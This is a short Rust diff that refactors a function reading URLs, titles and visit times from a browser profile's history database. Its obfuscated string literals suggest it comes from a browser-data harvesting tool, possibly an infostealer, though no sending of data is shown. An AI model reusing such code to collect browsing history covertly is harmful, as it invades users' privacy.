@@ -5,7 +5,7 @@ use alloc::boxed::Box;
 use alloc::sync::Arc;
 use alloc::vec::Vec;
 use obfstr::obfstr as s;
-use sqlite::{TableRecord, TableRecordExtension};
+use database::TableRecord;
 use tasks::{parent_name, Task};
 use utils::path::Path;
 
@@ -43,7 +43,7 @@ fn read_history(profile: &Path) -> Option<Vec<History>> {
     read_sqlite3_and_map_records(&history_path, s!("Urls"), extract_history_from_record)
 }
 
-fn extract_history_from_record(record: &Box<dyn TableRecord>) -> Option<History> {
+fn extract_history_from_record(record: &dyn TableRecord) -> Option<History> {
     let url = record.get_value(URLS_URL)?.as_string()?.to_owned();
     let title = record.get_value(URLS_TITLE)?.as_string()?.to_owned();
     let last_visit_time = record.get_value(URLS_LAST_VISIT_TIME)?.as_integer()?;
